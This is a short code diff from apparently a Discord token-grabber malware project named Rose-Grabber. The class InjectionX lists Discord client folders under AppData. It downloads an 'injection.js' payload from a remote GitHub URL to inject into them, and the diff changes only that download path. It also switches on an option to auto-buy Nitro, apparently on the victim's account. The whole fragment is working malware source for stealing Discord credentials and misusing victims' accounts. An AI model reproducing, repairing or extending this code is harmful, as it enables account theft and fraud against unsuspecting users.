@@ -20,7 +20,7 @@ class InjectionX:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/injection/injection.js').text
+        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/data/injection.js').text
         if cc.get_nitro_auto_buy() is True:
             self.code = self.code.replace("auto_buy_nitro: false,", "auto_buy_nitro: true,")
 
